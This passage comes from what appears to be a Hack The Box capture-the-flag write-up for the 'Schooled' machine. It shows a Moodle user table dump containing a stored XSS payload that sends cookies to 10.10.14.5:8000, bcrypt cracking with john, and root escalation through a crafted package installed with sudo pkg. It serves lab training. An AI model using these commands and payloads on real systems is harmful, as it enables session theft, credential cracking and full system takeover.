mdl_qtype_match_options
mdl_qtype_match_subquestions
mdl_qtype_multichoice_options
mdl_qtype_randomsamatch_options
mdl_qtype_shortanswer_options
mdl_question
mdl_question_answers
mdl_question_attempt_step_data
mdl_question_attempt_steps
mdl_question_attempts
mdl_question_calculated
mdl_question_calculated_options
mdl_question_categories
mdl_question_dataset_definitions
mdl_question_dataset_items
mdl_question_datasets
mdl_question_ddwtos
mdl_question_gapselect
mdl_question_hints
mdl_question_multianswer
mdl_question_numerical
mdl_question_numerical_options
mdl_question_numerical_units
mdl_question_response_analysis
mdl_question_response_count
mdl_question_statistics
mdl_question_truefalse
mdl_question_usages
mdl_quiz
mdl_quiz_attempts
mdl_quiz_feedback
mdl_quiz_grades
mdl_quiz_overrides
mdl_quiz_overview_regrades
mdl_quiz_reports
mdl_quiz_sections
mdl_quiz_slot_tags
mdl_quiz_slots
mdl_quiz_statistics
mdl_quizaccess_seb_quizsettings
mdl_quizaccess_seb_template
mdl_rating
mdl_registration_hubs
mdl_repository
mdl_repository_instance_config
mdl_repository_instances
mdl_repository_onedrive_access
mdl_resource
mdl_resource_old
mdl_role
mdl_role_allow_assign
mdl_role_allow_override
mdl_role_allow_switch
mdl_role_allow_view
mdl_role_assignments
mdl_role_capabilities
mdl_role_context_levels
mdl_role_names
mdl_scale
mdl_scale_history
mdl_scorm
mdl_scorm_aicc_session
mdl_scorm_scoes
mdl_scorm_scoes_data
mdl_scorm_scoes_track
mdl_scorm_seq_mapinfo
mdl_scorm_seq_objective
mdl_scorm_seq_rolluprule
mdl_scorm_seq_rolluprulecond
mdl_scorm_seq_rulecond
mdl_scorm_seq_ruleconds
mdl_search_index_requests
mdl_search_simpledb_index
mdl_sessions
mdl_stats_daily
mdl_stats_monthly
mdl_stats_user_daily
mdl_stats_user_monthly
mdl_stats_user_weekly
mdl_stats_weekly
mdl_survey
mdl_survey_analysis
mdl_survey_answers
mdl_survey_questions
mdl_tag
mdl_tag_area
mdl_tag_coll
mdl_tag_correlation
mdl_tag_instance
mdl_task_adhoc
mdl_task_log
mdl_task_scheduled
mdl_tool_cohortroles
mdl_tool_customlang
mdl_tool_customlang_components
mdl_tool_dataprivacy_category
mdl_tool_dataprivacy_ctxexpired
mdl_tool_dataprivacy_ctxinstance
mdl_tool_dataprivacy_ctxlevel
mdl_tool_dataprivacy_purpose
mdl_tool_dataprivacy_purposerole
mdl_tool_dataprivacy_request
mdl_tool_monitor_events
mdl_tool_monitor_history
mdl_tool_monitor_rules
mdl_tool_monitor_subscriptions
mdl_tool_policy
mdl_tool_policy_acceptances
mdl_tool_policy_versions
mdl_tool_recyclebin_category
mdl_tool_recyclebin_course
mdl_tool_usertours_steps
mdl_tool_usertours_tours
mdl_upgrade_log
mdl_url
mdl_user
mdl_user_devices
mdl_user_enrolments
mdl_user_info_category
mdl_user_info_data
mdl_user_info_field
mdl_user_lastaccess
mdl_user_password_history
mdl_user_password_resets
mdl_user_preferences
mdl_user_private_key
mdl_wiki
mdl_wiki_links
mdl_wiki_locks
mdl_wiki_pages
mdl_wiki_subwikis
mdl_wiki_synonyms
mdl_wiki_versions
mdl_workshop
mdl_workshop_aggregations
mdl_workshop_assessments
mdl_workshop_grades
mdl_workshop_submissions
mdl_workshopallocation_scheduled
mdl_workshopeval_best_settings
mdl_workshopform_accumulative
mdl_workshopform_comments
mdl_workshopform_numerrors
mdl_workshopform_numerrors_map
mdl_workshopform_rubric
mdl_workshopform_rubric_config
mdl_workshopform_rubric_levels
```

And we find table *mdl_user*, let's check it

```
$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; select * from mdl_user'
mysql: [Warning] Using a password on the command line interface can be insecure.
id      auth    confirmed       policyagreed    deleted suspended       mnethostid      username        password        idnumber        firstname       lastname        email      emailstop       icq     skype   yahoo   aim     msn     phone1  phone2  institution     department      address city    country lang    calendartype    theme   timezone   firstaccess     lastaccess      lastlogin       currentlogin    lastip  secret  picture url     description     descriptionformat       mailformat      maildigestmaildisplay      autosubscribe   trackforums     timecreated     timemodified    trustbitmask    imagealt        lastnamephonetic        firstnamephonetic       middlenamealternatename    moodlenetprofile
1       manual  1       0       0       0       1       guest   $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2            Guest user              root@localhost     0                                                                                                       en      gregorian               99      0       0       0 00               This user is a special user that allows read-only access to some courses.       1       1       0       2       1       0       0       1608320077      0 NULL     NULL    NULL    NULL    NULL    NULL
2       manual  1       0       0       0       1       admin   $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW            Jamie   Borham  jamie@staff.schooled.htb   0                                                                                       Bournemouth     GB      en      gregorian               99      16083201291608729680       1608681411      1608729680      192.168.1.14            0                       1       1       0       0       1       0       0       1608389236      0
3       manual  1       0       0       0       1       bell_oliver89   $2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK            Oliver  Bell    bell_oliver89@student.schooled.htb 0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608320808      1608320808      0
4       manual  1       0       0       0       1       orchid_sheila89 $2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC            Sheila  Orchid  orchid_sheila89@student.schooled.htb       0                                                                                       Bournemouth     GB      en      gregorian         99       0       0       0       0                       0                       1       1       0       2       1       0       1608321097      1608321097      0
5       manual  1       0       0       0       1       chard_ellzabeth89       $2y$10$D0Hu9XehYbTxNsf/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC            Elizabeth       Chard      chard_elizabeth89@student.schooled.htb  0                                                                                       Bournemouth     GB      en      gregorian          99      0       0       0       0                       0                       1       1       0       2       1       0       1608321183      16083211830
6       manual  1       0       0       0       1       morris_jake89   $2y$10$UieCKjut2IMiglWqRCkSzerF.8AnR8NtOLFmDUcQa90lair7LndRy            Jake    Morris  morris_jake89@student.schooled.htb 0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608380798      1608380798      0
7       manual  1       0       0       0       1       heel_james89    $2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim            James   Heel    heel_james89@student.schooled.htb  0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608380861      1608380861      0
8       manual  1       0       0       0       1       nash_michael89  $2y$10$yShrS/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu            Michael Nash    nash_michael89@student.schooled.htb        0                                                                                       Bournemouth     GB      en      gregorian         99       0       0       0       0                       0                       1       1       0       2       1       0       1608380931      1608380931      0
9       manual  1       0       0       0       1       singh_rakesh89  $2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu            Rakesh  Singh   singh_rakesh89@student.schooled.htb        0                                                                                       Bournemouth     GB      en      gregorian         99       0       0       0       0                       0                       1       1       0       2       1       0       1608381002      1608381002      0
10      manual  1       0       0       0       1       taint_marcus89  $2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa            Marcus  Taint   taint_marcus89@student.schooled.htb        0                                                                                       Bournemouth     GB      en      gregorian         99       0       0       0       0                       0                       1       1       0       2       1       0       1608381073      1608381073      0
11      manual  1       0       0       0       1       walls_shaun89   $2y$10$EDXwQZ9Dp6UNHjAF.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga            Shaun   Walls   walls_shaun89@student.schooled.htb 0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608381128      1608381128      0
12      manual  1       0       0       0       1       smith_john89    $2y$10$YRdwHxfstP0on0Yzd2jkNe/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em            John    Smith   smith_john89@student.schooled.htb  0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608381193      1608381193      0
13      manual  1       0       0       0       1       white_jack89    $2y$10$PRy8LErZpSKT7YuSxlWntOWK/5LmSEPYLafDd13Nv36MxlT5yOZqK            Jack    White   white_jack89@student.schooled.htb  0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608381255      1608381255      0
14      manual  1       0       0       0       1       travis_carl89   $2y$10$VO/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S            Carl    Travis  travis_carl89@student.schooled.htb 0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608381313      1608381313      0
15      manual  1       0       0       0       1       mac_amy89       $2y$10$PgOU/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i            Amy     Mac     mac_amy89@student.schooled.htb     0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608381361      1608381361      0
16      manual  1       0       0       0       1       james_boris89   $2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba/1MgsQ9P/hcwErzAYUtzWq            Boris   James   james_boris89@student.schooled.htb 0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608381410      1608381410      0
17      manual  1       0       0       0       1       pierce_allan    $2y$10$ia9fKz9.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy            Allan   Pierce  pierce_allan89@student.schooled.htb        0                                                                                       Bournemouth     GB      en      gregorian         99       0       0       0       0                       0                       1       1       0       2       1       0       1608381478      1608381478      0
18      manual  1       0       0       0       1       henry_william89 $2y$10$qj67d57dL/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu            William Henry   henry_william89@student.schooled.htb       0                                                                                       Bournemouth     GB      en      gregorian         99       0       0       0       0                       0                       1       1       0       2       1       0       1608381530      1608381530      0
19      manual  1       0       0       0       1       harper_zoe89    $2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy            Zoe     Harper  harper_zoe89@student.schooled.htb  0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608381592      1608381592      0
20      manual  1       0       0       0       1       wright_travis89 $2y$10$XFE/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm            Travis  Wright  wright_travis89@student.schooled.htb       0                                                                                       Bournemouth     GB      en      gregorian         99       0       0       0       0                       0                       1       1       0       2       1       0       1608381677      1608381677      0
21      manual  1       0       0       0       1       allen_matthew89 $2y$10$kFYnbkwG.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq            Matthew Allen   allen_matthew89@student.schooled.htb       0                                                                                       Bournemouth     GB      en      gregorian         99       0       0       0       0                       0                       1       1       0       2       1       0       1608381732      1608381732      0
22      manual  1       0       0       0       1       sanders_wallis89        $2y$10$br9VzK6V17zJttyB8jK9Tub/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u            Wallis  Sanders sanders_wallis89@student.schooled.htb      0                                                                                       Bournemouth     GB      en      gregorian 99       0       0       0       0                       0                       1       1       0       2       1       0       1608381797      1608381797      0
23      manual  1       0       0       0       1       higgins_jane    $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2            Jane    Higgins higgins_jane@staff.schooled.htb    0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608382421      1608382421      0
24      manual  1       0       0       0       1       phillips_manuel $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG            Manuel  Phillips        phillips_manuel@staff.schooled.htb 0                                                                                       Bournemouth     GB      en      gregorian         99       1608681510      1620013246      1620013122      1620013246      127.0.0.1               0                       1       1       0       2       1       0       1608382537 1608681490      0
25      manual  1       0       0       0       1       carter_lianne   $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe            Lianne  Carter  carter_lianne@staff.schooled.htb   0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0                       0                       1       1       0       2       1       0       1608382633      1608382633      0
26      email   0       0       0       0       1       parker_dan89    $2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi            Dan     Parker  parker_dan89@student.schooled.htb  0                                                                                       Bournemouth     GB      en      gregorian               9900       0       0               6IwNTLYu1F22aFR 0               NULL    1       1       0       2       1       0       1608386568      1608386568      0       NULL      NULL
27      onlineconfirm   1       0       0       0       1       parker_tim89    $2y$10$YCYp8F91YdvY2QCg3Cl5r.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S            Tim     Parker  parker_tim89@student.schooled.htb  0                                                                                       Bournemouth     GB      en      gregorian         99       1608386933      1608387350      1608386933      1608387350      192.168.1.14    ea9Xkf0O0ZWzfRh 0               NULL    1       1       0       2       1       0 1608386929       1608386929      0       NULL                                    NULL
28      onlineconfirm   1       0       0       0       1       pash3nlee       $2y$10$WDMT61dfu9ZdUvD6rQtMdOI71zZxAHRq1AKUlGP1X/qcPCIJDK2H2            Pasha   Pasha   pasha@student.schooled.htb 0                                                                                                       en      gregorian               99      1620012459 1620012846      0       1620012459      10.10.14.5      caz9OM4veE7yaIy 0                       1       1       0       2       1       0       1620012455      1620012619 0                                               <script>var i=new Image;i.src="http://10.10.14.5:8000/?"+document.cookie;</script>
$ 
```

And we get hash of password.

```
$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
Jamie   Borham
```

We need to crack it. So let's detect type of hash.

In this [site](https://hashes.com/en/tools/hash_identifier) we can see, that type of hash is possible bcrypt

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-05-03_104013.png)

We will use [john](https://unicornsec.com/home/tryhackme-crack-the-hash) to crack it.

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# cat hash.txt                                                                                                                                                     130 ⨯
$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt -format=bcrypt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (?)
1g 0:00:01:59 DONE (2021-05-02 23:47) 0.008357g/s 116.1p/s 116.1c/s 116.1C/s aldrich..superpet
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we get a password **!QAZ2wsx**.

Use ssh to login and getting **user.txt**

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# ssh jamie@schooled.htb              
The authenticity of host 'schooled.htb (10.10.10.234)' can't be established.
ECDSA key fingerprint is SHA256:BiWc+ARPWyYTueBR7SHXcDYRuGsJ60y1fPuKakCZYDc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'schooled.htb,10.10.10.234' (ECDSA) to the list of known hosts.
Password for jamie@Schooled:
Last login: Tue Mar 16 14:44:53 2021 from 10.10.14.5
FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

To change this login announcement, see motd(5).
Are you looking for a package? Search for it with
"pkg search part_of_package_name"

                -- Lars Engels <lme@FreeBSD.org>
jamie@Schooled:~ $ ls
user.txt
jamie@Schooled:~ $ cat user.txt 
1ab1726271ab888370c1735754446c1a
```

# Privilege Escalation#2

Also there is another user *Steve*

```
jamie@Schooled:~ $ cat /etc/passwd
# $FreeBSD$
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
ntpd:*:123:123:NTP Daemon:/var/db/ntp:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
tests:*:977:977:Unprivileged user for tests:/nonexistent:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
cyrus:*:60:60:the cyrus mail server:/nonexistent:/usr/sbin/nologin
mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin
_tss:*:601:601:TCG Software Stack user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
polkitd:*:565:565:Polkit Daemon User:/var/empty:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
colord:*:970:970:colord color management daemon:/nonexistent:/usr/sbin/nologin
steve:*:1002:1002:User &:/home/steve:/bin/csh
jamie@Schooled:~ $ cd ..
jamie@Schooled:/home $ ls
jamie   steve
jamie@Schooled:/home $ cd steve
cd: steve: Permission denied
```

Interesting.. Let's check jamies's privileges

```
jamie@Schooled:/home $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

Ok, we can run some command with sudo privileges.

In this [site](https://gtfobins.github.io/gtfobins/pkg/) we find what to do.

>If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
It runs commands using a specially crafted FreeBSD package. Generate it with fpm and upload it to the target

Ok, now we need to install [fpm](https://fpm.readthedocs.io/en/latest/installing.html) to crafted FreeBSD package.

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# gem install --no-document fpm                                                                                                             

Fetching clamp-1.0.1.gem
Fetching cabin-0.9.0.gem
Fetching backports-3.21.0.gem
Fetching arr-pm-0.0.10.gem
Fetching io-like-0.3.1.gem
Fetching ruby-xz-0.2.3.gem
Fetching stud-0.0.23.gem
Fetching childprocess-0.9.0.gem
Fetching mustache-0.99.8.gem
Fetching fpm-1.12.0.gem
Fetching insist-1.0.0.gem
Fetching dotenv-2.7.6.gem
Fetching pleaserun-0.0.32.gem
Fetching git-1.8.1.gem
Successfully installed cabin-0.9.0
Successfully installed backports-3.21.0
Successfully installed arr-pm-0.0.10
Successfully installed clamp-1.0.1
Successfully installed childprocess-0.9.0
Successfully installed io-like-0.3.1
Successfully installed ruby-xz-0.2.3
Successfully installed stud-0.0.23
Successfully installed mustache-0.99.8
Successfully installed insist-1.0.0
Successfully installed dotenv-2.7.6
Successfully installed pleaserun-0.0.32
Successfully installed git-1.8.1
Successfully installed fpm-1.12.0
14 gems installed
```

Now we need to create package and put our payload in it

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# TF=$(mktemp -d)                                                                                                                           
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# echo 'cat /root/root.txt' > $TF/x.sh
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use #finish to prevent that.
/var/lib/gems/2.7.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in `initialize'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `block in output'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `output'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute'
        /var/lib/gems/2.7.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in `run'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run'
        /var/lib/gems/2.7.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in `run'
        /var/lib/gems/2.7.0/gems/fpm-1.12.0/bin/fpm:7:in `<top (required)>'
        /usr/local/bin/fpm:23:in `load'
        /usr/local/bin/fpm:23:in `<main>'
Created package {:path=>"x-1.0.txz"}
```

And we get our FreeBSD package. Use scp to deliver to schooled.htb.

```
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# ls
cookie.txt  hash.txt  Moodle_RCE  pasha.php  x-1.0.txz
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Schooled]
└─# scp x-1.0.txz jamie@schooled.htb:/home/jamie                        
Password for jamie@Schooled:
x-1.0.txz                                                                                                                                100%  476     2.3KB/s   00:00    
```

Let's install our crafted package with sudo privileges

```
jamie@Schooled:~ $ ls
user.txt        x-1.0.txz
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
jamie@Schooled:~ $ sudo /usr/sbin/pkg install -y --no-repo-update ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: 1
[1/1] Installing x-1.0...
93fcfc41e5d305013bc5475bb32da871
Extracting x-1.0: 100%
```

And we get **root.txt**.

# Result and Resources

1. https://www.cybersecurity-help.cz/vdb/SB2020072004
2. https://www.cybersecurity-help.cz/vulnerabilities/31682/
3. https://www.youtube.com/watch?v=BkEInFI4oIU
4. https://github.com/HoangKien1020/CVE-2020-14321
5. https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md
6. https://hashes.com/en/tools/hash_identifier
7. https://gtfobins.github.io/gtfobins/pkg/
